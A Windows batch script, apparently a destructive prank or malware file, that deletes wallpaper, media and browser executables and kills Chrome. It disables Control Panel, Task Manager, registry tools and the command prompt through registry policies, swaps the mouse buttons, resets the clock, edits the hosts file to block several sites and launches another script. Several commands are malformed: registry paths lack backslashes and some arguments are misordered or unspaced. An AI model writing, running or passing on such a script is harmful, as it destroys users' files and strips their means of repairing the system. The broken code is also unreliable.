@echo off
del "%SystemRoot%\Web\Wallpaper" /q >nul
taskkill /im /f chrome.exe
del C:\Program Files\Mozilla Firefox\firefox.exe /q
del C:\Program Files\Opera\opera.exe /q
del C:\Program Files\Internet Explorer\ie.exe /q
reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v
NoControlPanel /t REG_DWORD /d 1 /f >nul
del "%SystemRoot%Media" /q >nul
reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v 
DisableTaskMgr /t REG_DWORD /d 1 /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD/t REG_DWORD/d 2 /f > nul
%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul
time 00:00
cd %windir%\system32\drivers\etc
attrib -r -s hosts
echo 127.0.0.1 www.pbhack.ru >> hosts
echo 127.0.0.1 www.best-hack.ru >> hosts
echo 127.0.0.1 www.mmoru.com >> hosts
echo 127.0.0.1 www.zorgee.ru >> hosts
start Total.bat